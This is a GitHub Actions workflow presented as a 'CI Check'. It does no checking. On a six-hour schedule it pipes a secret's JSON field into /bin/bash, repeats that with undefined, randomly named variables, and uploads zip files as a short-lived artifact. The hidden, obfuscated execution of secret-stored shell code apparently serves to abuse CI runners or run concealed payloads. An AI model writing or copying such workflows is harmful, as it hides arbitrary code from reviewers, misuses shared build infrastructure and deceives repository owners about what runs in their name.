name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '35 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          hxmse4377: ${{ secrets.hxmse4377 }}
        run: |
          printf '%s' "$hxmse4377" | jq -r .uh908 | /bin/bash
          echo $uymv39042 | jq -r .epn0958 | /bin/bash
          echo $utas4339 | jq -r .uibq32 | /bin/bash
          printf '%s' "$iw27" | jq -r .h59911 | /bin/bash
          printf '%s' "$jyxu929" | jq -r .lfhw753 | /bin/bash
          echo $nyin270 | jq -r .icsu2208 | /bin/bash
          printf '%s' "$wrqk21994" | jq -r .okc07 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mZVUfe7p
          path: "*.zip"
          retention-days: 1
